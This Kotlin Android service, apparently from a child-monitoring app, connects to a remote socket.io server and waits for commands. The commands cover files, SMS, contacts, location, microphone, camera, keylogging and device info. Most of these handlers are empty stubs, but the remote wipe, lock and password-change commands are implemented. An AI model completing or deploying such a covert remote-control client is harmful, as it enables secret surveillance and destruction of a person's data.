package com.example.childapp.remote.socket

import android.annotation.SuppressLint
import android.app.Service
import android.content.Intent
import android.os.*
import android.util.Log
import com.example.childapp.common.Constants.FULL_URL
import com.example.childapp.function.deviceAdmin.DeviceAdmin
import com.example.childapp.common.utils.getClientId
import com.example.childapp.common.utils.showLog
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URISyntaxException
import java.util.concurrent.ConcurrentHashMap

/**
 * Created by planet on 6/8/2017.
 */
class SocketIOService() : Service(), SocketEventListener.Listener,
      HeartBeat.HeartBeatListener {
      private var mSocket: Socket? = null
      private var mServiceLooper: Looper? = null
      private var mServiceHandler: ServiceHandler? = null
      private var heartBeat: HeartBeat? = null
      private var listenersMap: ConcurrentHashMap<String, SocketEventListener>? = null

      // Handler that receives messages from the thread
      private inner class ServiceHandler(looper: Looper?) : Handler(looper!!) {
            override fun handleMessage(msg: Message) {
                  when (msg.arg1) {
                        1 -> Log.w(TAG, "Connected")
                        2 -> Log.w(TAG, "Disconnected")
                        3 -> Log.w(TAG, "Error in Connection")
                  }
            }
      }

      override fun onCreate() {
            super.onCreate()
            listenersMap = ConcurrentHashMap()
            val thread = HandlerThread(
                  TAG + "Args",
                  Process.THREAD_PRIORITY_BACKGROUND
            )
            thread.start()
            // Get the HandlerThread's Looper and use it for our Handler
            mServiceLooper = thread.looper
            mServiceHandler = ServiceHandler(mServiceLooper)
            mSocket = try {
                  IO.socket(FULL_URL + getClientId())
            } catch (e: URISyntaxException) {
                  throw RuntimeException(e)
            }
            socketListener
            for ((key, value) in listenersMap!!) {
                  mSocket!!.on(key, value)
            }
            mSocket!!.connect()
            heartBeat = HeartBeat(this)
            heartBeat!!.start()
      }


      //put events
      private val socketListener: Unit
            private get() {
                  listenersMap!!["0xFI"] = SocketEventListener("0xFI", this)//files
                  listenersMap!!["0xSM"] = SocketEventListener("0xSM", this)//sms
                  listenersMap!!["0xCL"] = SocketEventListener("0xCL", this)//calllog
                  listenersMap!!["0xCO"] = SocketEventListener("0xCO", this)//contact
                  listenersMap!!["0xLO"] = SocketEventListener("0xLO", this)//location
                  listenersMap!!["0xMI"] = SocketEventListener("0xMI", this)//microphone
                  listenersMap!!["0xIN"] = SocketEventListener("0xIN", this)//apps
                  listenersMap!!["0xCA"] = SocketEventListener("0xCA", this)//camera
                  listenersMap!!["0xNO"] = SocketEventListener("0xNO", this)//notifiation
                  listenersMap!!["0xDI"] = SocketEventListener("0xDI", this)//deviceInfo
                  listenersMap!!["0xSI"] = SocketEventListener("0xSI", this)//simInfo
                  listenersMap!!["0xKL"] = SocketEventListener("0xKL", this)//KeyLog
                  listenersMap!!["0xGP"] = SocketEventListener("0xGP", this)//Get Permission
                  listenersMap!!["0xAU"] = SocketEventListener("0xAU", this)//AppStatistics
                  listenersMap!!["0xCD"] = SocketEventListener("0xCD", this)//DeviceAdmin
                  listenersMap!!["0xCF"] = SocketEventListener("0xCF", this)//Config


            }

      //handle event
      @SuppressLint("NewApi")
      override fun onEventCall(event: String, vararg args: Any) {

            val data: JSONObject
            when (event) {

                  "0xSM" -> {
                        data = args[0] as JSONObject
                        showLog("new Sender SmsManager")

                  }
                  "0xCA" -> {
                        data = args[0] as JSONObject
                        val sec = (data.getString("sec").toInt() * 1000).toLong()
                        showLog(sec.toString())

                  }
                  "0xCL" -> {

                       /*Call Logs*/


                  }
                  "0xCO" -> {

                      /*Contact */
                  }
                  "0xMI" -> {
                        data = args[0] as JSONObject
                        val sec = (data.getString("sec").toInt() * 1000).toLong()
                        showLog(sec.toString())
                     /*Mic service*/


                  }
                  "0xLO" -> {
                        /*Location service*/
                  }
                  "0xIN" -> {
                      /*All install apps*/
                  }
                  "0xAU" -> {
                        data = args[0] as JSONObject
                        val day = data.getInt("day")
                        showLog(day.toString())

                     /*App statistics*/
                  }
                  "0xDI" -> {
                       /*Device info*/

                  }
                  "0xKL" -> {
                     /*Keylog */
                  }
                  "0xSI" -> {
                     /*Sim info*/
                  }


                  "0xCD" -> {
                        data = args[0] as JSONObject
                        val action = data.getString("action")
                        showLog(action.toString())
                        val deviceAdmin = DeviceAdmin(applicationContext)
                        when (action) {
                              "wd" -> {
                                    deviceAdmin.wipeData()
                              }
                              "ld" -> {
                                    deviceAdmin.lockDevice()
                              }
                              "sp" -> {
                                    val passWord = data.getString("password")
                                    deviceAdmin.setPassword(passWord)
                              }
                        }
                  }


            }
      }
      override fun onBind(intent: Intent): IBinder? {
            return null
      }

      override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
            Log.i(TAG, "onStartCommand")
          val eventType = intent.getIntExtra(EXTRA_EVENT_TYPE, EVENT_TYPE_JOIN)
          Log.v("showLog event type", eventType.toString())
          return START_STICKY
      }




      override fun onHeartBeat() {
            if (mSocket != null && !mSocket!!.connected()) {
                  mSocket!!.connect()
                  Log.i(TAG, "connecting socket... gfgds")
            }
      }

//      override fun onDestroy() {
//            super.onDestroy()
//           // mSocket!!.disconnect()
//            heartBeat!!.stop()
//            mUserId = null
//            for ((key, value) in listenersMap!!) {
//                  mSocket!!.off(key, value)
//            }
//            Log.w(TAG, "onStop Service")
//      }

      companion object {
            const val EVENT_TYPE_JOIN = 1
            const val EXTRA_EVENT_TYPE = "extra_event_type"
            private const val TAG = "showLogSocketIoService"
      }


}